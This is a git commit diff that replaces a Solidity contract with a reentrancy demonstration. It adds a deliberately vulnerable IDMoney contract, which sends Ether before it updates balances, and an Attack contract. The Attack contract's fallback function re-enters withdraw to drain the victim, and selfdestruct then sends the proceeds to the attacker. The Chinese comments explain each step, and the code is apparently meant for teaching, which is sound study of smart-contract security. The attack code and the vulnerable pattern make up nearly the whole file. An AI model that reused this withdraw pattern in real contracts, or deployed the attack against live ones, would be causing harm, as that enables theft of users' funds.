c8072b60121af107ea87bd8b99ac7a00faf9b34d
B0444110 <36958333+B0444110@users.noreply.github.com>
2020-12-20 16:25:40 +0800

    Update Reentrancy.sol

--- Reentrancy/Reentrancy.sol
+++ Reentrancy/Reentrancy.sol
@@ -1,17 +1,60 @@
-pragma solidity ^0.5.5;
+pragma solidity ^0.4.10;
 
-contract kingOfCountry {
-    address payable  public king;
-    uint256 public price;
-    constructor() public{
-        price=1;
+contract IDMoney {
+    address owner;
+    mapping (address => uint256) balances;  // 紀錄資產
+
+    event withdrawLog(address, uint256);
+
+    function IDMoney() { owner = msg.sender; }
+    function deposit() payable { balances[msg.sender] += msg.value; }
+    function withdraw(address to, uint256 amount) {
+        require(balances[msg.sender] > amount);
+        require(this.balance > amount);
+
+        withdrawLog(to, amount);  // 印log，以便觀察 reentrancy
+
+        to.call.value(amount)();  // 用 call.value()() 來轉帳時，把所有的 Gas 给外部
+        balances[msg.sender] -= amount;
     }
-    function becomeking() payable public {
-        require(msg.value > 0);
-        
-        require(msg.value > price); // 付錢當國王
-        king.transfer(price);   // 給前任補償
-        king = msg.sender;      // 加冕新國王
-        price = msg.value * 2;           // 付兩倍的錢當新國王
+    function balanceOf() returns (uint256) { return balances[msg.sender]; }
+    function balanceOf(address addr) returns (uint256) { return balances[addr]; }
+}
+contract Attack {
+    address owner;
+    address victim;
+
+    modifier ownerOnly { require(owner == msg.sender); _; }
+
+    function Attack() payable { owner = msg.sender; }
+
+    // 設已部署的 IDMoney 合约地址
+    function setVictim(address target) ownerOnly { victim = target; }
+
+    // deposit Ether to IDMoney deployed
+    function step1(uint256 amount) ownerOnly payable {
+        if (this.balance > amount) {
+            victim.call.value(amount)(bytes4(keccak256("deposit()")));
+        }
+    }
+    // withdraw Ether from IDMoney deployed
+    function step2(uint256 amount) ownerOnly {
+        victim.call(bytes4(keccak256("withdraw(address,uint256)")), this, amount);
+    }
+    // selfdestruct, send all balance to owner
+    function stopAttack() ownerOnly {
+        selfdestruct(owner);
+    }
+
+    function startAttack(uint256 amount) ownerOnly {
+        step1(amount);
+        step2(amount / 2);
+    }
+
+    function () payable {
+        if (msg.sender == victim) {
+            // 再次試著調用 IDCoin 的 sendCoin 函数，遞迴轉帳
+            victim.call(bytes4(keccak256("withdraw(address,uint256)")), this, msg.value);
+        }
     }
 }
